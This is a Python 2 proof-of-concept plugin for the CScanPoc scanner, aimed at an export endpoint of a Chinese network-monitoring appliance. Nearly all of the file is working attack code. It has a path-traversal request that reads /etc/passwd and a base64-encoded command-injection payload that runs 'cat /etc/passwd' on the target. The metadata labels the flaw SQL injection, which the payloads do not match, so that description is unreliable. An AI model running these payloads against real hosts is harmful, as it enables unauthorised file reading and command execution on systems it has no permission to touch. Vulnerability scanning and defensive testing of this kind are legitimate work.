# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Seentech_0005' # 平台漏洞编号，留空
    name = '中科新业网络哨兵 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-02'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵 /ucenter/admin/export.php 参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '86052c19-0056-4833-b875-b308cddc2526'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0123366
            hh = hackhttp.hackhttp()
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            payload1 = "/ucenter/admin/export.php?kind=log&gNetGuardLogFilePath=&filename=../../../../../../../../etc/passwd"
            payload2 = "/ucenter/admin/export.php?gCommand=zero_tools&cmd=IiAmIGNhdCAvZXRjL3Bhc3N3ZCAmICI%3D"
            for i in payload1,payload2:
                code, _, res, _, _ = hh.http(self.target + i, headers=headers)
                if code == 200 and 'root:/bin/bash' in res :
                    #security_warning(arg+i)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
